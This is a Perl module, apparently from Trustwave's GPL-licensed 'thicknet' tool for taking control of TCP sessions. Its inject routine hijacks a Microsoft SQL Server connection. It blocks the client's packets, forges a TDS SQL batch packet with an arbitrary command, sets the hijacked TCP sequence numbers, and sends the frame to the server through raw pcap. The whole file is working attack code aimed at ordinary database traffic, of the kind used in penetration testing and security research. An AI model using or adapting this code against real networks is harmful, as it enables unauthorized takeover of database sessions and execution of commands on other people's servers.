package thicknet::session::MSSQL;

=header
    thicknet - A tool to manipulate and take control of TCP sessions
	Created by Steve Ocepek and Wendel G. Henrique
	Copyright (C) 2010, 2011 Trustwave Holdings, Inc.
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use base thicknet::session::Session;

use Exporter;
use Net::Pcap;
use NetPacket::Ethernet qw(:strip);
use NetPacket::TCP;
use NetPacket::IP;
use Encode qw(encode);
use Data::HexDump;
use thicknet::Util;
use thicknet::pcap::ARP;

sub downgrade {
	my ($self,$text) = @_;
	return "Downgrade not supported";
}

sub inject {
    my ($self,$cmd) = ($_[0],$_[1]);
    
    # Start blocking packets
    $self->{block} = 1;
    
    # Get copy of sled
    my $ip_obj = NetPacket::IP->decode(eth_strip($self->{sled}->{pkt}));
    my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	
	# There are no session static values
	# Just create a new packet and inject
	my $str = encode("UCS-2LE", $cmd);
	my $len = length($str) + 30;
	my $data = pack('C*',0x01,0x01,0x00,$len,0x00,0x00,0x01,0x00,0x16,0x00,0x00,0x00,0x12,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00);
	$data = $data . $str;
	
	# Set Seq and Ack accordingly
	$tcp_obj->{seqnum} = $self->{client_seq};
	$tcp_obj->{acknum} = $self->{server_seq};
	
	# Insert new data
	$tcp_obj->{data} = $data;
	
	# Encode for transmission	
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($self->{server}), $self->{mymac}, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($self->{pcaph}, $pkt);
	
	# Increment client (our) sequence number
    $self->{client_seq} += length($tcp_obj->{data});
}
1;